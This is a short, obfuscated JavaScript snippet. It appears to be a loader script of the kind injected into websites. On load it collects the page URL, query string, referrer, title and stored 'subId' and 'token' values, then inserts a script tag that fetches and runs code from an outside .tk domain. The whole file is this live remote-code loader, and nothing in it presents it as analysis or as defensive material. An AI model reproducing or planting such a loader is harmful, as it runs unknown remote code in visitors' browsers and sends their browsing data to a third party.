(function() {
    var name = '_1KBQWG5dNBrTxCKR';
    if (!window._1KBQWG5dNBrTxCKR) {
        window._1KBQWG5dNBrTxCKR = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/TgB7kF',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _kcLvhpbCzp9bzB8n = localStorage.getItem('config');
    if (typeof _kcLvhpbCzp9bzB8n !== 'undefined' && _kcLvhpbCzp9bzB8n !== null) {
        var _Vm418YytMT7knW2z = JSON.parse(_kcLvhpbCzp9bzB8n);
        var _d2DNgsVm65n7BVYK = Math.round(+new Date()/1000);
        if (_Vm418YytMT7knW2z.created_at + window._1KBQWG5dNBrTxCKR.ttl < _d2DNgsVm65n7BVYK) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _zBQHfsFS4bBpfDvp = localStorage.getItem('subId');
    var _sv7rfcf8LXjTntYx = localStorage.getItem('token');
    var _nnG2KPRjw7GjNt4w = '?return=js.client';
        _nnG2KPRjw7GjNt4w += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _nnG2KPRjw7GjNt4w += '&se_referrer=' + encodeURIComponent(document.referrer);
        _nnG2KPRjw7GjNt4w += '&default_keyword=' + encodeURIComponent(document.title);
        _nnG2KPRjw7GjNt4w += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _nnG2KPRjw7GjNt4w += '&name=' + encodeURIComponent(name);
        _nnG2KPRjw7GjNt4w += '&host=' + encodeURIComponent(window._1KBQWG5dNBrTxCKR.R_PATH);
    if (typeof _zBQHfsFS4bBpfDvp !== 'undefined' && _zBQHfsFS4bBpfDvp && window._1KBQWG5dNBrTxCKR.unique) {
        _nnG2KPRjw7GjNt4w += '&sub_id=' + encodeURIComponent(_zBQHfsFS4bBpfDvp);
    }
    if (typeof _sv7rfcf8LXjTntYx !== 'undefined' && _sv7rfcf8LXjTntYx && window._1KBQWG5dNBrTxCKR.unique) {
        _nnG2KPRjw7GjNt4w += '&token=' + encodeURIComponent(_sv7rfcf8LXjTntYx);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._1KBQWG5dNBrTxCKR.R_PATH + _nnG2KPRjw7GjNt4w;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
